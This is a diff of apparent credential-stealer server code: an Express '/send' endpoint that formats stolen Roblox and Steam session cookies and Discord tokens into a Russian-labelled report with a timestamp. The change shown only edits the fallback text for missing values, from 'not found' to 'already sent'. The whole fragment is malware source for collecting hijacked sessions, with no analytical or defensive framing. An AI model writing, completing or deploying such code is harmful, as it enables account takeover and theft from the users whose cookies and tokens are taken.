@@ -22,13 +22,13 @@ app.post('/send', async (req, res) => {
         msg += "━━━━━━━━━━━━━━━━━━\n\n";
 
         msg += "🍪 <b>ROBLOX COOKIE:</b>\n";
-        msg += robloxCookie ? "<code>" + robloxCookie + "</code>\n\n" : "❌ Не найден\n\n";
+        msg += robloxCookie ? "<code>" + robloxCookie + "</code>\n\n" : "✅ Уже отправлен\n\n";
 
         msg += "🎮 <b>STEAM COOKIE:</b>\n";
-        msg += steamCookie ? "<code>" + steamCookie + "</code>\n\n" : "❌ Не найден\n\n";
+        msg += steamCookie ? "<code>" + steamCookie + "</code>\n\n" : "✅ Уже отправлен\n\n";
 
         msg += "💬 <b>DISCORD TOKEN:</b>\n";
-        msg += discordToken ? "<code>" + discordToken + "</code>\n\n" : "❌ Discord не открыт\n\n";
+        msg += discordToken ? "<code>" + discordToken + "</code>\n\n" : "✅ Уже отправлен\n\n";
 
         msg += "━━━━━━━━━━━━━━━━━━\n";
         msg += "⏰ <b>Время:</b> " + new Date().toLocaleString("ru-RU");
